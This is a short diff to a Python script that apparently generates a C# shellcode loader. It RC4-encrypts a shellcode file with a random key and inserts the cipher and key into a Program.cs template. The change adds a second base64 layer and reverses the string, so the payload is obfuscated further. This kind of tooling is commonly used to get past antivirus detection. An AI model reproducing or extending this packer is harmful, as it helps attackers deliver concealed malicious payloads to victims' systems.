@@ -149,7 +149,7 @@ if __name__ == "__main__":
     rc4 = RC4()
     gen = Generator()
     key = gen.gen_rc4_key(32)
-    cipher = base64.b64encode(rc4.Encrypt(Helper.load_file(config.get("shellcode"), True), key))
+    cipher = base64.b64encode(base64.b64encode(rc4.Encrypt(Helper.load_file(config.get("shellcode"), True), key))[::-1])
     
     template = gen.set_template("template/Program.cs").get_output()
     template = template.replace("[KEY]", gen.format_rc4_key(key)) \
